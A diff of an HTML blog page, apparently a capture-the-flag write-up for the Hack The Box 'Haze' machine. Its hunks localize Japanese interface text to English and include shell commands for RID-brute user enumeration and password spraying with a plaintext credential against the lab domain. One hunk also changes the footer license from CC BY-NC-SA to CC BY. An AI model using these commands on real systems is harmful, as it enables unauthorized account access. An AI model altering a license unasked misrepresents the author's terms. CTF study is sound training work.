@@ -153,7 +153,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -271,7 +271,7 @@
             </figure>
 
 <h2 id="users"><a href="#users" class="headerlink" title="users"></a>users</h2><p>获取用户名之类信息：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nxc smb haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute 10000 | grep SidTypeUser | cut -d ':' -f2 | cut -d '\' -f2 | cut -d ' ' -f1 &gt; users.txt</span><br><span class="line"></span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line"><span class="meta">DC01$</span><span class="bash"></span></span><br><span class="line">paul.taylor</span><br><span class="line">mark.adams</span><br><span class="line">edward.martin</span><br><span class="line">alexander.green</span><br><span class="line"><span class="meta">Haze-IT-Backup$</span><span class="bash"></span></span><br><span class="line"><span class="meta">serio$</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nxc smb haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute 10000 | grep SidTypeUser | cut -d ':' -f2 | cut -d '\' -f2 | cut -d ' ' -f1 &gt; users.txt</span><br><span class="line"></span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line"><span class="meta">DC01$</span></span><br><span class="line">paul.taylor</span><br><span class="line">mark.adams</span><br><span class="line">edward.martin</span><br><span class="line">alexander.green</span><br><span class="line"><span class="meta">Haze-IT-Backup$</span></span><br><span class="line"><span class="meta">serio$</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="mark-adams"><a href="#mark-adams" class="headerlink" title="mark.adams"></a>mark.adams</h2><p>密码喷洒可以发现mark.adams也使用这个密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nxc smb haze.htb -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success</span><br><span class="line"></span><br><span class="line">SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24</span><br><span class="line">SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24</span><br></pre></td></tr></table></figure>
@@ -415,7 +415,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2025-07-02T04:59:48.903Z" itemprop="dateUpdated">2025-07-02 12:59:48</time>
+    Last updated: <time datetime="2025-07-02T04:59:48.903Z" itemprop="dateUpdated">2025-07-02 12:59:48</time>
 </span><br>
 
 
@@ -582,7 +582,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
